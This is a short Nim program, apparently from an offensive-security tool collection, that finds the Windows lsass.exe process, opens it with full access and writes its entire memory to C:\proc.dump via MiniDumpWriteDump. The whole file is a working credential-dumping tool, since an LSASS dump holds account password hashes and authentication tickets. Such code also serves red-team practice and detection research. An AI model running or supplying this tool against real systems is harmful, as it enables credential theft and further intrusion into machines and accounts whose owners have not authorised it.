#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    Enumerates all processes to find lsass.exe and creates a memorydump using MiniDumpWriteDump

    References:
        - https://gist.github.com/xpn/e3837a4fdee8ea1b05f7fea5e7ea9444
        - https://github.com/juancarlospaco/psutil-nim/blob/master/src/psutil/psutil_windows.nim#L55
        - https://github.com/byt3bl33d3r/SILENTTRINITY/blob/master/silenttrinity/core/teamserver/modules/boo/src/minidump.boo
]#

import winim
import strutils

type
    MINIDUMP_TYPE = enum
        MiniDumpWithFullMemory = 0x00000002

proc MiniDumpWriteDump(
    hProcess: HANDLE,
    ProcessId: DWORD, 
    hFile: HANDLE, 
    DumpType: MINIDUMP_TYPE, 
    ExceptionParam: INT, 
    UserStreamParam: INT,
    CallbackParam: INT
): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}

proc GetLsassPid(): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            # At the time of writing, Nim doesn't have a built in way of converting a char array to a string
            var exeName: string = newString(entry.szExeFile.len)
            for ch in entry.szExeFile:
                add(exeName, cast[char](ch))
            if exeName.strip(chars={'\0'}) == "lsass.exe":
                return int(entry.th32ProcessID)

    return 0

when isMainModule:
    let processId: int = GetLsassPid()
    if not bool(processId):
        echo "[X] Unable to find lsass process"
        quit(1)

    echo "[*] lsass process PID: ", processId
    var hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](processId))
    var fs = open(r"C:\proc.dump", fmWrite)
    
    var success = MiniDumpWriteDump(
        hProcess,
        cast[DWORD](processId),
        fs.getOsFileHandle(),
        MiniDumpWithFullMemory,
        0,
        0,
        0
    )

    fs.close()
    echo "[*] Dump successful: ", bool(success)